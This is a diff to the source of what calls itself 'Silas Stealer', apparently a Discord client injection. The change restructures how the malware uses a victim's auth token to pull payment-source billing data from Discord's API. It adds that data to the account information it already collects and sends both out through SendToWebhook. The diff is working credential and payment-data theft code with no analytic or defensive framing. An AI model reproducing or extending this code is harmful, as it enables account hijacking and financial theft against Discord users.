@@ -76,14 +76,9 @@ function GetBadges(flags) {
     return badges
 }
 
-function PM(token) {
-    const window = BrowserWindow.getAllWindows()[0];
-window.webContents.executeJavaScript(`
-var xmlHttp = new XMLHttpRequest();
-xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-xmlHttp.setRequestHeader("Authorization", "${token}");
-xmlHttp.send( null );
-xmlHttp.responseText`, !0).then((pm) => {
+function PM(sex) {
+ var pm = JSON.parse(sex)
+
     var billing = "";
     pm.forEach(z => {
         if (z.type == "") {
@@ -101,7 +96,6 @@ xmlHttp.responseText`, !0).then((pm) => {
     }
     return billing
 
-})
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -358,6 +352,13 @@ xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
 xmlHttp.responseText;`, !0).then((info) => {
+    window.webContents.executeJavaScript(`
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+xmlHttp.setRequestHeader("Authorization", "${token}");
+xmlHttp.send( null );
+xmlHttp.responseText`, !0).then((pm) => {
+
     const json = JSON.parse(info);
     var params = {
         username: "Silas Stealer",
@@ -394,7 +395,7 @@ xmlHttp.responseText;`, !0).then((info) => {
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `${PM(token)}`,
+                            "value": `${PM(pm)}`,
                             "inline": false
     },
 
@@ -412,7 +413,7 @@ xmlHttp.responseText;`, !0).then((info) => {
     }
     SendToWebhook(JSON.stringify(params))
 })
-    
+})
 			}))
 		}
 	}
